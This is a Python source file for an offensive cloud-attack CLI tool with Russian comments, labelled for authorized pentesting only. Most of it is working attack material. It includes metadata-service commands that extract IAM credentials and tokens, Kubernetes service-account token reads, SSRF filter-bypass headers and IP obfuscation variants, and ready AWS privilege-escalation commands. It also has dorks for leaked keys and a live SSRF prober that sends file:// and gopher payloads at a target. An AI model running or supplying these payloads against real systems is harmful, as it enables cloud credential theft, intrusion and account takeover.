"""
Cloud Attack Pro — расширенный.
Author: idqwixxa

⚠ Только для авторизованного пентеста / bug bounty / CTF.

Возможности:
    ─── IMDS payloads ───
    - AWS IMDSv1 + IMDSv2 (с bypass technique)
    - GCP metadata + Workload Identity
    - Azure IMDS + MSI
    - DigitalOcean, Alibaba, Oracle OCI
    - K8s service account + Docker API + Consul

    ─── AWS IAM privesc ───
    - 12+ путей (Rhino Security Labs list)
    - Live проверка (если aws CLI)
    - Findings → notes

    ─── SSRF payloads ───
    - IP bypass: decimal / octal / hex / IPv6 / nip.io / DNS rebinding
    - Bypass headers: X-Forwarded-*, X-Original-URL, Forwarded

    ─── Dorks ───
    - GitHub / GitLab / Google / Shodan
    - Cloud-specific (S3, Azure blob, GCS, Firebase)

    ─── Lambda / Functions ───
    - Env dump hints
    - Runtime API hints
    - GCP / Azure Functions

    ─── Интеграция ───
    - Findings → notes
    - Notify
    - JSON / HTML экспорт
"""
import html as html_mod
import json
import os
import re
import shutil
import subprocess
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any

import requests
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.table import Table

from core.config import config, REPORT_DIR
from core.database import db
from core.logger import get_logger

console = Console()
log = get_logger(__name__)

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CAP_DIR = REPORT_DIR / "cloud_attack_pro"
CAP_DIR.mkdir(parents=True, exist_ok=True)

TIMEOUT = 15


# ===========================================================================
# Модель
# ===========================================================================

@dataclass
class CAPFinding:
    kind: str
    severity: str
    title: str
    target: str = ""
    evidence: str = ""
    data: dict = field(default_factory=dict)


def _save_finding(f: CAPFinding) -> int:
    if f.severity not in ("critical", "high"):
        return -1
    try:
        from modules import notes
        return notes.add_note(
            kind="finding",
            title=f.title,
            target=f.target,
            severity=f.severity,
            status="open",
            tags=["cloud-attack", f.kind],
            body=(f"**Kind:** {f.kind}\n"
                  f"**Target:** {f.target}\n\n"
                  f"**Evidence:**\n```\n{(f.evidence or '—')[:1500]}\n```\n\n"
                  f"**Data:** `{json.dumps(f.data, ensure_ascii=False, default=str)[:1500]}`"),
        )
    except Exception:
        return -1


# ===========================================================================
# IMDS payloads
# ===========================================================================

IMDSV2_PAYLOADS = {
    "aws_imdsv1": {
        "name": "AWS IMDSv1 (legacy)",
        "steps": [
            "curl http://169.254.169.254/latest/meta-data/",
            "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>",
            "curl http://169.254.169.254/latest/user-data",
            "curl http://169.254.169.254/latest/dynamic/instance-identity/document",
        ],
        "note": "Требуется IMDSv1. Проверь: curl -X PUT "
                "http://169.254.169.254/latest/api/token",
    },
    "aws_imdsv2": {
        "name": "AWS IMDSv2 (requires token)",
        "steps": [
            "# Step 1: получить token",
            "TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" "
            "-H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")",
            "# Step 2: использовать token",
            "curl -H \"X-aws-ec2-metadata-token: $TOKEN\" "
            "http://169.254.169.254/latest/meta-data/",
            "curl -H \"X-aws-ec2-metadata-token: $TOKEN\" "
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "curl -H \"X-aws-ec2-metadata-token: $TOKEN\" "
            "http://169.254.169.254/latest/user-data",
        ],
        "note": "SSRF с PUT-запросом → IMDSv2 bypass",
    },
    "gcp_metadata": {
        "name": "GCP metadata (v1)",
        "steps": [
            "curl http://metadata.google.internal/computeMetadata/v1/ "
            "-H \"Metadata-Flavor: Google\"",
            "curl http://metadata.google.internal/computeMetadata/v1/"
            "instance/service-accounts/default/token "
            "-H \"Metadata-Flavor: Google\"",
            "curl http://metadata.google.internal/computeMetadata/v1/"
            "instance/service-accounts/default/email "
            "-H \"Metadata-Flavor: Google\"",
            "curl http://metadata.google.internal/computeMetadata/v1/"
            "instance/service-accounts/default/scopes "
            "-H \"Metadata-Flavor: Google\"",
            "curl http://metadata.google.internal/computeMetadata/v1/"
            "instance/attributes/ -H \"Metadata-Flavor: Google\"",
            "curl http://metadata.google.internal/computeMetadata/v1/"
            "project/attributes/ssh-keys -H \"Metadata-Flavor: Google\"",
            "curl http://metadata.google.internal/computeMetadata/v1/"
            "project/attributes/google-compute-default-service-account "
            "-H \"Metadata-Flavor: Google\"",
        ],
        "note": "GCP требует header Metadata-Flavor: Google",
    },
    "azure_imds": {
        "name": "Azure IMDS",
        "steps": [
            "curl 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' "
            "-H 'Metadata: true'",
            "curl 'http://169.254.169.254/metadata/identity/oauth2/token"
            "?api-version=2018-02-01&resource=https://management.azure.com/' "
            "-H 'Metadata: true'",
            "curl 'http://169.254.169.254/metadata/identity/oauth2/token"
            "?api-version=2018-02-01&resource=https://vault.azure.net' "
            "-H 'Metadata: true'",
            "curl 'http://169.254.169.254/metadata/identity/oauth2/token"
            "?api-version=2018-02-01&resource=https://storage.azure.com/' "
            "-H 'Metadata: true'",
        ],
        "note": "Header Metadata: true обязателен",
    },
    "digitalocean": {
        "name": "DigitalOcean metadata",
        "steps": [
            "curl http://169.254.169.254/metadata/v1/",
            "curl http://169.254.169.254/metadata/v1/id",
            "curl http://169.254.169.254/metadata/v1/user-data",
            "curl http://169.254.169.254/metadata/v1/interfaces/",
            "curl http://169.254.169.254/metadata/v1/dns/nameservers",
            "curl http://169.254.169.254/metadata/v1/floating_ip/ipv4/active",
        ],
        "note": "Не требует auth-заголовков",
    },
    "alibaba": {
        "name": "Alibaba Cloud",
        "steps": [
            "curl http://100.100.100.200/latest/meta-data/",
            "curl http://100.100.100.200/latest/meta-data/ram/security-credentials/",
            "curl http://100.100.100.200/latest/meta-data/instance-id",
            "curl http://100.100.100.200/latest/meta-data/region-id",
            "curl http://100.100.100.200/latest/user-data",
        ],
        "note": "Особый IP 100.100.100.200",
    },
    "oracle_oci": {
        "name": "Oracle Cloud",
        "steps": [
            "curl http://169.254.169.254/opc/v1/instance/",
            "curl http://169.254.169.254/opc/v1/identity/",
            "curl http://169.254.169.254/opc/v1/vnics/",
        ],
        "note": "OCI использует /opc/v1/",
    },
    "k8s_pod": {
        "name": "Kubernetes Pod",
        "steps": [
            "curl https://kubernetes.default.svc/api/v1/namespaces",
            "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
            "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace",
            "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
            "curl http://localhost:10255/pods",
            "curl http://localhost:10250/pods",
        ],
        "note": "SA token + K8s API от pod",
    },
    "docker_api": {
        "name": "Docker API",
        "steps": [
            "curl http://localhost:2375/version",
            "curl http://localhost:2375/containers/json",
            "curl http://localhost:2375/images/json",
            "curl http://localhost:2375/info",
        ],
        "note": "Docker socket/API — escape-вектор",
    },
    "consul_vault": {
        "name": "Consul / Vault",
        "steps": [
            "curl http://localhost:8500/v1/agent/self",
            "curl http://localhost:8500/v1/catalog/nodes",
            "curl http://localhost:8500/v1/kv/?recurse",
            "curl http://localhost:8200/v1/sys/health",
            "curl http://localhost:8200/v1/sys/seal-status",
        ],
        "note": "HashiCorp Consul + Vault",
    },
}


SSRF_BYPASS_HEADERS = [
    "X-Forwarded-For: 169.254.169.254",
    "X-Forwarded-Host: 169.254.169.254",
    "X-Forwarded-Server: 169.254.169.254",
    "X-Forwarded-Proto: http",
    "X-Original-URL: http://169.254.169.254/",
    "X-Rewrite-URL: http://169.254.169.254/",
    "X-Override-URL: http://169.254.169.254/",
    "Forwarded: for=169.254.169.254;proto=http",
    "X-Client-IP: 169.254.169.254",
    "X-Real-IP: 169.254.169.254",
    "CF-Connecting-IP: 169.254.169.254",
    "True-Client-IP: 169.254.169.254",
    "Fastly-Client-IP: 169.254.169.254",
    "X-Custom-IP-Authorization: 169.254.169.254",
]


# IP bypass representations
def _ip_variants(ip: str) -> list[str]:
    """Все варианты обхода IP-фильтров."""
    try:
        import ipaddress
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return []

    variants: list[str] = [ip]
    if addr.version == 4:
        # Decimal
        variants.append(str(int(addr)))
        # Octal
        parts = str(addr).split(".")
        variants.append("0" + format(int(addr), "o"))
        variants.append(".".join(f"0{int(p):o}" for p in parts))
        # Hex
        variants.append("0x" + format(int(addr), "x"))
        variants.append(".".join(f"0x{int(p):02x}" for p in parts))
        # Shorthand
        if ip.startswith("127."):
            variants.extend(["127.1", "127.0.1", "127.0.0.1.nip.io",
                              "127.0.0.1.sslip.io"])
        # IPv6-mapped
        variants.append(f"[::ffff:{ip}]")
        # Trailing dot
        variants.append(f"{ip}.")
        # CIDR tricks
        variants.append(f"{ip}%00.example.com")
    return list(dict.fromkeys(variants))


# ===========================================================================
# AWS IAM privesc paths
# ===========================================================================

AWS_PRIVESC_PATHS = [
    {
        "name": "iam:CreatePolicyVersion",
        "perms": ["iam:CreatePolicyVersion"],
        "impact": "critical",
        "cmd": "aws iam create-policy-version --policy-arn <arn> "
               "--policy-document '{\"Version\":\"2012-10-17\","
               "\"Statement\":[{\"Effect\":\"Allow\","
               "\"Action\":\"*\",\"Resource\":\"*\"}]}' --set-as-default",
    },
    {
        "name": "iam:SetDefaultPolicyVersion",
        "perms": ["iam:SetDefaultPolicyVersion"],
        "impact": "high",
        "cmd": "aws iam set-default-policy-version --policy-arn <arn> "
               "--version-id <id>",
    },
    {
        "name": "iam:PassRole + ec2:RunInstances",
        "perms": ["iam:PassRole", "ec2:RunInstances"],
        "impact": "critical",
        "cmd": "aws ec2 run-instances --image-id ami-xxx "
               "--instance-type t2.micro --iam-instance-profile "
               "Name=admin-profile --user-data file://shell.sh",
    },
    {
        "name": "iam:PassRole + lambda:CreateFunction",
        "perms": ["iam:PassRole", "lambda:CreateFunction",
                  "lambda:InvokeFunction"],
        "impact": "critical",
        "cmd": "aws lambda create-function --function-name pwn "
               "--runtime python3.11 --role <admin-arn> "
               "--handler index.handler --zip-file fileb://payload.zip "
               "&& aws lambda invoke --function-name pwn out.json",
    },
    {
        "name": "iam:AttachUserPolicy",
        "perms": ["iam:AttachUserPolicy"],
        "impact": "critical",
        "cmd": "aws iam attach-user-policy --user-name <me> "
               "--policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
    },
    {
        "name": "iam:AddUserToGroup",
        "perms": ["iam:AddUserToGroup"],
        "impact": "high",
        "cmd": "aws iam add-user-to-group --user-name <me> "
               "--group-name Admins",
    },
    {
        "name": "iam:CreateAccessKey",
        "perms": ["iam:CreateAccessKey"],
        "impact": "high",
        "cmd": "aws iam create-access-key --user-name <admin-user>",
    },
    {
        "name": "iam:UpdateLoginProfile",
        "perms": ["iam:UpdateLoginProfile"],
        "impact": "high",
        "cmd": "aws iam update-login-profile --user-name <admin> "
               "--password 'NewP@ssw0rd'",
    },
    {
        "name": "iam:PutUserPolicy",
        "perms": ["iam:PutUserPolicy"],
        "impact": "critical",
        "cmd": "aws iam put-user-policy --user-name <me> "
               "--policy-name pwn --policy-document "
               "'{\"Version\":\"2012-10-17\",\"Statement\":[]}'",
    },
    {
        "name": "iam:PutGroupPolicy",
        "perms": ["iam:PutGroupPolicy"],
        "impact": "critical",
        "cmd": "aws iam put-group-policy --group-name <grp> "
               "--policy-name pwn --policy-document file://pwn.json",
    },
    {
        "name": "sts:AssumeRole",
        "perms": ["sts:AssumeRole"],
        "impact": "medium",
        "cmd": "aws sts assume-role --role-arn <admin-arn> "
               "--role-session-name pwn",
    },
    {
        "name": "lambda:UpdateFunctionCode",
        "perms": ["lambda:UpdateFunctionCode", "lambda:InvokeFunction"],
        "impact": "high",
        "cmd": "aws lambda update-function-code --function-name <fn> "
               "--zip-file fileb://payload.zip",
    },
    {
        "name": "glue:UpdateDevEndpoint",
        "perms": ["glue:UpdateDevEndpoint"],
        "impact": "high",
        "cmd": "aws glue update-dev-endpoint --endpoint-name <name> "
               "--public-key file://ssh_key.pub",
    },
    {
        "name": "cloudformation:CreateStack",
        "perms": ["cloudformation:CreateStack", "iam:PassRole"],
        "impact": "critical",
        "cmd": "aws cloudformation create-stack --stack-name pwn "
               "--template-body file://template.yaml "
               "--capabilities CAPABILITY_IAM --role-arn <admin-arn>",
    },
    {
        "name": "datapipeline:CreatePipeline + PutPipelineDefinition",
        "perms": ["datapipeline:CreatePipeline",
                  "datapipeline:PutPipelineDefinition",
                  "iam:PassRole"],
        "impact": "high",
        "cmd": "aws datapipeline create-pipeline --name pwn --unique-id pwn "
               "&& aws datapipeline put-pipeline-definition "
               "--pipeline-id <id> --pipeline-definition file://def.json",
    },
    {
        "name": "ssm:SendCommand",
        "perms": ["ssm:SendCommand"],
        "impact": "high",
        "cmd": "aws ssm send-command --document-name AWS-RunShellScript "
               "--targets Key=instanceids,Values=<id> "
               "--parameters commands='whoami'",
    },
]


# ===========================================================================
# Dorks
# ===========================================================================

DORKS = {
    "github": [
        'org:{ORG} "AKIA" language:JSON',
        'org:{ORG} "aws_secret_access_key" language:JSON',
        'org:{ORG} "private_key" extension:json',
        '"{ORG}" "BEGIN RSA PRIVATE KEY"',
        '"{ORG}" "BEGIN OPENSSH PRIVATE KEY"',
        '"{ORG}" "service_account" filename:credentials.json',
        '"{ORG}" "client_secret"',
        '"{ORG}" "sk_live_"',
        '"{ORG}" "AIzaSy"',
        '"{ORG}" filename:.env',
        '"{ORG}" filename:terraform.tfstate',
    ],
    "gitlab": [
        '"{ORG}" blob:credentials.json',
        '"{ORG}" "AKIA"',
        '"{ORG}" filename:.env',
        '"{ORG}" extension:tfstate',
    ],
    "google": [
        'site:pastebin.com "{ORG}" "AKIA"',
        'site:trello.com "{ORG}" "password"',
        'site:s3.amazonaws.com "{ORG}"',
        'site:blob.core.windows.net "{ORG}"',
        'site:storage.googleapis.com "{ORG}"',
        'site:firebaseio.com "{ORG}"',
        'site:*.s3.amazonaws.com "{ORG}"',
        '"{ORG}" filetype:env',
        '"{ORG}" filetype:json "aws_secret"',
    ],
    "shodan": [
        'org:"{ORG}" port:27017',
        'org:"{ORG}" port:9200',
        'org:"{ORG}" port:6379',
        'org:"{ORG}" port:2375',
        'org:"{ORG}" port:10250',
        'org:"{ORG}" port:11211',
    ],
}


# ===========================================================================
# Lambda dump
# ===========================================================================

LAMBDA_DUMP_STEPS = [
    ("AWS Lambda runtime API",
     "# Если внутри Lambda — получить invocation\n"
     "curl http://localhost:9001/2018-06-01/runtime/invocation/next\n"
     "# Env (включая keys)\n"
     "env | grep -i aws"),
    ("AWS Lambda env vars",
     "env | grep -iE 'AWS_|LAMBDA_'\n"
     "# AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, "
     "AWS_SESSION_TOKEN, AWS_LAMBDA_FUNCTION_NAME, "
     "AWS_LAMBDA_FUNCTION_VERSION"),
    ("AWS Lambda role via IMDS",
     "TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token "
     "-H 'X-aws-ec2-metadata-token-ttl-seconds: 60')\n"
     "curl -H \"X-aws-ec2-metadata-token: $TOKEN\" "
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("GCP Cloud Function",
     "curl http://metadata.google.internal/computeMetadata/v1/"
     "instance/service-accounts/default/token "
     "-H 'Metadata-Flavor: Google'\n"
     "env | grep -iE 'FUNCTION_|K_SERVICE'"),
    ("Azure Function App",
     "env | grep -iE 'AZURE_|FUNCTIONS_'\n"
     "curl 'http://169.254.169.254/metadata/identity/oauth2/token"
     "?api-version=2018-02-01&resource=https://vault.azure.net' "
     "-H 'Metadata: true'"),
]


# ===========================================================================
# Display helpers
# ===========================================================================

def show_imds_payloads(provider: str | None = None) -> None:
    providers = [provider] if provider else list(IMDSV2_PAYLOADS.keys())
    for key in providers:
        data = IMDSV2_PAYLOADS.get(key)
        if not data:
            console.print(f"[red]Неизвестный провайдер: {key}[/red]")
            continue
        console.print(f"\n[bold cyan]═══ {data['name']} ═══[/bold cyan]")
        console.print(f"[dim]{data['note']}[/dim]\n")
        t = Table(show_header=False, border_style="dim")
        t.add_column("Step", style="green")
        for step in data["steps"]:
            for line in step.split("\n"):
                t.add_row(line)
        console.print(t)
    db.save_scan("cloud_imds", provider or "all", {})


def show_privesc_paths() -> None:
    t = Table(title=f"⚡ AWS IAM privesc paths ({len(AWS_PRIVESC_PATHS)})")
    t.add_column("#", width=4)
    t.add_column("Path", style="cyan", max_width=42)
    t.add_column("Impact", style="red", width=10)
    t.add_column("Perms", style="magenta", max_width=40)
    for i, p in enumerate(AWS_PRIVESC_PATHS, 1):
        t.add_row(str(i), p["name"], p["impact"].upper(),
                  ", ".join(p["perms"])[:40])
    console.print(t)

    choice = Prompt.ask("Детали (номер, Enter = нет)",
                        default="").strip()
    if choice.isdigit() and 1 <= int(choice) <= len(AWS_PRIVESC_PATHS):
        p = AWS_PRIVESC_PATHS[int(choice) - 1]
        console.print(f"\n[bold cyan]{p['name']}[/bold cyan]")
        console.print(f"[magenta]Perms:[/magenta] {', '.join(p['perms'])}")
        console.print(f"[red]Impact:[/red] {p['impact'].upper()}\n")
        tt = Table(show_header=False, border_style="dim")
        tt.add_column("Command")
        for line in p["cmd"].split("\n"):
            tt.add_row(f"[green]{line}[/green]")
        console.print(tt)


def show_ssrf_bypass_headers() -> None:
    t = Table(title=f"🔓 SSRF bypass headers ({len(SSRF_BYPASS_HEADERS)})")
    t.add_column("#", width=4)
    t.add_column("Header", style="cyan")
    for i, h in enumerate(SSRF_BYPASS_HEADERS, 1):
        t.add_row(str(i), h)
    console.print(t)

    # IP bypasses
    console.print("\n[bold cyan]IP bypass variants:[/bold cyan]")
    for target in ("127.0.0.1", "169.254.169.254", "10.0.0.1"):
        variants = _ip_variants(target)
        console.print(f"\n[magenta]{target}[/magenta] ({len(variants)}):")
        for v in variants[:10]:
            console.print(f"  • [green]{v}[/green]")


def show_cloud_dorks(org: str) -> None:
    console.print(f"\n[bold cyan]═══ Cloud secret dorks: {org} "
                  f"═══[/bold cyan]\n")
    for provider, dorks in DORKS.items():
        t = Table(title=f"[bold green]{provider}[/bold green]")
        t.add_column("#", width=4)
        t.add_column("Dork", style="cyan")
        for i, d in enumerate(dorks, 1):
            t.add_row(str(i), d.format(ORG=org))
        console.print(t)
    db.save_scan("cloud_dorks", org,
                 {"count": sum(len(v) for v in DORKS.values())})


def show_lambda_dump() -> None:
    console.print("\n[bold cyan]═══ Lambda / Functions dump ═══[/bold cyan]\n")
    for title, cmd in LAMBDA_DUMP_STEPS:
        t = Table(title=f"[bold green]{title}[/bold green]",
                  show_header=False, border_style="dim")
        t.add_column("Command")
        for line in cmd.split("\n"):
            t.add_row(f"[green]{line}[/green]")
        console.print(t)


# ===========================================================================
# Live checks — AWS chain
# ===========================================================================

def _run_aws_cli(args: list[str], timeout: int = 15,
                  env_extra: dict | None = None
                  ) -> tuple[int, str, str]:
    if not shutil.which("aws"):
        return (-1, "", "aws CLI not installed")
    env = os.environ.copy()
    if env_extra:
        env.update(env_extra)
    try:
        r = subprocess.run(["aws"] + args, capture_output=True,
                           text=True, env=env, timeout=timeout)
        return r.returncode, r.stdout or "", r.stderr or ""
    except Exception as exc:
        return (-1, "", str(exc))


def aws_identity_chain(access_key: str, secret_key: str,
                        session_token: str = "") -> dict:
    """Live цепочка AWS: identity + permissions + privesc."""
    if not shutil.which("aws"):
        console.print("[yellow]aws CLI не установлен.[/yellow]")
        return {}
    env_extra = {
        "AWS_ACCESS_KEY_ID": access_key,
        "AWS_SECRET_ACCESS_KEY": secret_key,
        "AWS_DEFAULT_REGION": "us-east-1",
    }
    if session_token:
        env_extra["AWS_SESSION_TOKEN"] = session_token

    result: dict = {"allowed": [], "privesc": []}

    # 1. Whoami
    rc, out, err = _run_aws_cli(["sts", "get-caller-identity",
                                  "--output", "json"],
                                 env_extra=env_extra)
    if rc != 0:
        console.print(f"[red]✗ {err.strip()[:200]}[/red]")
        return {}
    try:
        result["identity"] = json.loads(out)
        console.print(f"[green]✓ {result['identity'].get('Arn')}[/green]")
    except Exception:
        return {}

    # 2. Permissions
    perms = [
        ("iam:ListUsers", ["iam", "list-users"], "medium"),
        ("iam:ListRoles", ["iam", "list-roles"], "medium"),
        ("iam:ListPolicies", ["iam", "list-policies", "--scope", "Local"],
         "medium"),
        ("iam:ListAccessKeys", ["iam", "list-access-keys"], "high"),
        ("s3:ListBuckets", ["s3", "ls"], "high"),
        ("ec2:DescribeInstances",
         ["ec2", "describe-instances", "--region", "us-east-1"], "medium"),
        ("lambda:ListFunctions",
         ["lambda", "list-functions", "--region", "us-east-1"], "high"),
        ("secretsmanager:ListSecrets",
         ["secretsmanager", "list-secrets", "--region", "us-east-1"],
         "critical"),
        ("ssm:DescribeParameters",
         ["ssm", "describe-parameters", "--region", "us-east-1"],
         "critical"),
    ]
    t = Table(title="🔓 AWS permissions")
    t.add_column("Action", style="cyan", max_width=40)
    t.add_column("Status", width=8)
    t.add_column("Sev", width=9)
    for name, cmd, sev in perms:
        rc, out, err = _run_aws_cli(cmd, env_extra=env_extra, timeout=10)
        if rc == 0:
            result["allowed"].append(name)
            t.add_row(name, "[green]✓[/green]", sev.upper())
            if sev in ("high", "critical"):
                _save_finding(CAPFinding(
                    kind="aws_permission",
                    severity="high",
                    title=f"AWS: {name} allowed",
                    target=result["identity"].get("Arn", ""),
                    evidence=f"Command: aws {' '.join(cmd)}",
                    data={"action": name},
                ))
        elif "AccessDenied" in err:
            t.add_row(name, "[dim]✗[/dim]", sev.upper())
        else:
            t.add_row(name, "[yellow]?[/yellow]", sev.upper())
    console.print(t)

    # 3. Privesc check
    console.print("\n[cyan]⚡ Privesc paths:[/cyan]")
    t2 = Table(title="⚡ AWS privesc candidates")
    t2.add_column("Path", style="cyan", max_width=40)
    t2.add_column("Impact", width=10)
    for path in AWS_PRIVESC_PATHS:
        if any(p in result["allowed"] for p in path["perms"]):
            t2.add_row(path["name"], path["impact"].upper())
            result["privesc"].append(path["name"])
            _save_finding(CAPFinding(
                kind="aws_privesc_candidate",
                severity=path["impact"],
                title=f"AWS privesc candidate: {path['name']}",
                target=result["identity"].get("Arn", ""),
                evidence=path["cmd"],
                data={"path": path["name"], "impact": path["impact"]},
            ))
    console.print(t2)

    if result["privesc"]:
        console.print(f"\n[red]⚠ {len(result['privesc'])} privesc "
                      f"кандидатов[/red]")

    db.save_scan("cloud_aws_chain",
                 result["identity"].get("Account", "?"), result)
    return result


def check_metadata_ssrf(target_url: str) -> None:
    """SSRF → metadata live probe."""
    console.print(f"[cyan]🔍 SSRF → metadata: {target_url}[/cyan]")

    test_urls = [
        ("http://169.254.169.254/latest/meta-data/", "AWS IMDSv1"),
        ("http://169.254.169.254/latest/api/token", "AWS IMDSv2 token"),
        ("http://metadata.google.internal/computeMetadata/v1/", "GCP"),
        ("http://169.254.169.254/metadata/v1/", "DO"),
        ("http://100.100.100.200/latest/meta-data/", "Alibaba"),
        ("http://169.254.169.254/opc/v1/", "Oracle OCI"),
        ("file:///etc/passwd", "file:// LFI"),
        ("gopher://localhost:6379/_INFO", "gopher Redis"),
    ]
    t = Table(title="SSRF → metadata")
    t.add_column("Payload", style="cyan", max_width=48)
    t.add_column("Status", width=8)
    t.add_column("Len", width=8)
    t.add_column("Snippet", style="green", max_width=45)

    findings_count = 0
    for payload, label in test_urls:
        try:
            url = target_url.replace("FUZZ", payload)
            r = requests.get(url, timeout=TIMEOUT, verify=False,
                              headers={"User-Agent": config.USER_AGENT})
            snippet = r.text[:45].replace("\n", " ")
            t.add_row(f"{label}: {payload[:35]}", str(r.status_code),
                      str(len(r.content)), snippet)

            # Если 200 и похоже на metadata / passwd
            if r.status_code == 200 and len(r.content) > 0:
                body_lower = r.text.lower()
                if any(marker in body_lower for marker in [
                    "ami-", "i-", "instance-id", "instance-id",
                    "security-credentials", "root:x:0:0",
                    "computeMetadata", "project-id",
                ]):
                    _save_finding(CAPFinding(
                        kind="ssrf_metadata",
                        severity="critical",
                        title=f"SSRF → metadata leak on {target_url[:60]}",
                        target=target_url[:100],
                        evidence=f"Payload: {payload}\n"
                                 f"Response: {r.text[:500]}",
                        data={"payload": payload, "status": r.status_code},
                    ))
                    findings_count += 1
        except Exception as exc:
            t.add_row(label, "[red]err[/red]", "—", str(exc)[:45])
    console.print(t)

    if findings_count:
        console.print(f"\n[red]⚠ Найдено {findings_count} "
                      f"metadata leak![/red]")


# ===========================================================================
# Экспорт
# ===========================================================================

def _export_json(findings: list[CAPFinding],
                  path: str | None = None) -> Path | None:
    if not path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = str(CAP_DIR / f"findings_{ts}.json")
    try:
        Path(path).write_text(
            json.dumps([asdict(f) for f in findings],
                       indent=2, ensure_ascii=False, default=str),
            encoding="utf-8")
        console.print(f"[green]✓ JSON: {path}[/green]")
        return Path(path)
    except Exception as exc:
        console.print(f"[red]JSON: {exc}[/red]")
        return None


def _export_html(findings: list[CAPFinding],
                  path: str | None = None) -> Path | None:
    if not path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = str(CAP_DIR / f"findings_{ts}.html")

    parts = [
        "<!DOCTYPE html><html lang='ru'><head><meta charset='utf-8'>",
        "<title>Cloud Attack Pro — Findings</title>",
        "<style>",
        "body{background:#0a0a0a;color:#c8c8c8;font-family:monospace;"
        "padding:24px;line-height:1.5;}",
        "h1{color:#00ff9c;border-bottom:2px solid #00ff9c;}",
        "table{width:100%;border-collapse:collapse;margin-top:12px;"
        "font-size:13px;}",
        "th{background:#111;color:#00ff9c;padding:8px;text-align:left;"
        "border:1px solid #222;}",
        "td{padding:6px 8px;border:1px solid #222;word-break:break-all;}",
        "tr:nth-child(even){background:#0d0d0d;}",
        ".critical{color:#ff2020;font-weight:bold;}",
        ".high{color:#ff7a40;font-weight:bold;}",
        ".medium{color:#ffd23f;}",
        "</style></head><body>",
        f"<h1>☁  Cloud Attack Pro — Findings ({len(findings)})</h1>",
        f"<p>Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>",
        "<table><tr><th>Kind</th><th>Severity</th><th>Title</th>"
        "<th>Target</th></tr>",
    ]
    for f in findings:
        parts.append(
            f"<tr><td>{html_mod.escape(f.kind)}</td>"
            f"<td class='{f.severity}'>{f.severity.upper()}</td>"
            f"<td>{html_mod.escape(f.title[:100])}</td>"
            f"<td>{html_mod.escape(f.target[:80])}</td></tr>"
        )
    parts.append("</table></body></html>")

    try:
        Path(path).write_text("\n".join(parts), encoding="utf-8")
        console.print(f"[green]✓ HTML: {path}[/green]")
        return Path(path)
    except Exception as exc:
        console.print(f"[red]HTML: {exc}[/red]")
        return None


# ===========================================================================
# CLI-обёртки (совместимы со старыми)
# ===========================================================================

def cli_imds(provider: str | None = None) -> None:
    show_imds_payloads(provider)


def cli_privesc() -> None:
    show_privesc_paths()


def cli_ssrf_headers() -> None:
    show_ssrf_bypass_headers()


def cli_aws_chain(access_key: str, secret_key: str,
                   session_token: str = "") -> None:
    aws_identity_chain(access_key, secret_key, session_token)


def cli_metadata_ssrf(url: str) -> None:
    check_metadata_ssrf(url)


def cli_dorks(org: str) -> None:
    show_cloud_dorks(org)


def cli_lambda() -> None:
    show_lambda_dump()


def cli_ip_bypass() -> None:
    """Показать IP bypass варианты."""
    console.print("[bold cyan]IP bypass variants:[/bold cyan]\n")
    for target in ("127.0.0.1", "169.254.169.254", "10.0.0.1",
                    "192.168.1.1"):
        variants = _ip_variants(target)
        t = Table(title=f"{target}")
        t.add_column("#", width=4)
        t.add_column("Variant", style="green")
        for i, v in enumerate(variants, 1):
            t.add_row(str(i), v)
        console.print(t)


# ===========================================================================
# Меню
# ===========================================================================

def menu() -> None:
    t = Table(title="[bold]☁  Cloud Attack Pro[/bold]")
    t.add_column("№", style="yellow")
    t.add_column("Опция")
    opts = [
        ("1", "IMDS payload chains (9 провайдеров)"),
        ("2", "AWS IAM privesc paths (16 техник)"),
        ("3", "SSRF bypass headers + IP bypasses"),
        ("4", "IP bypass variants (все формы)"),
        ("5", "AWS credential chain (live)"),
        ("6", "SSRF → metadata live probe"),
        ("7", "Cloud secret dorks"),
        ("8", "Lambda / Functions dump"),
        ("9", "Экспорт JSON / HTML"),
    ]
    for n, o in opts:
        t.add_row(n, o)
    console.print(t)
    console.print("[yellow]⚠ Только для авторизованного пентеста.[/yellow]")
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    if c == "1":
        p = Prompt.ask("Провайдер (Enter = все)",
                        default="").strip() or None
        show_imds_payloads(p)
    elif c == "2":
        show_privesc_paths()
    elif c == "3":
        show_ssrf_bypass_headers()
    elif c == "4":
        cli_ip_bypass()
    elif c == "5":
        ak = Prompt.ask("AWS Access Key")
        sk = Prompt.ask("AWS Secret Key", password=True)
        st = Prompt.ask("Session token (Enter = нет)", default="")
        aws_identity_chain(ak, sk, st)
    elif c == "6":
        url = Prompt.ask("URL с FUZZ-плейсхолдером",
                          default="https://example.com/api?url=FUZZ")
        check_metadata_ssrf(url)
    elif c == "7":
        org = Prompt.ask("Организация/домен для dorks")
        show_cloud_dorks(org)
    elif c == "8":
        show_lambda_dump()
    elif c == "9":
        fmt = Prompt.ask("Формат", choices=["json", "html"], default="json")
        findings: list[CAPFinding] = []
        if fmt == "json":
            _export_json(findings)
        else:
            _export_html(findings)